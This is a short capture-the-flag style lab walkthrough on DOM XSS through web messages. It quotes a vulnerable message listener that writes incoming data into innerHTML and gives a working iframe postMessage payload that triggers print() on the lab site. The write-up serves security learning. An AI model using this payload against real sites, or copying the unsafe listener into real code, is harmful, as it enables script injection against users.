Title: DOM XSS using web messages
Level: PRACTITIONER
Desc: This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called. 

# Walkthrough:
In web page source code I found this:
<img width="1061" height="363" alt="image" src="https://github.com/user-attachments/assets/8757e91b-a35e-481e-a32f-a864269ecdd7" />

This code is vulnerable to DOM XSS:
```
<div id='ads'>
                    </div>
                    <script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```

I can use this page in iFrame and using iFrame I can send POST message with malicious function:
`<iframe src="https://0af300ba03e1981380b42643003c00de.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')">`

Victim after loading that message would have windows with application in iframe and in the same time our payload would execute causing print() function to appear.
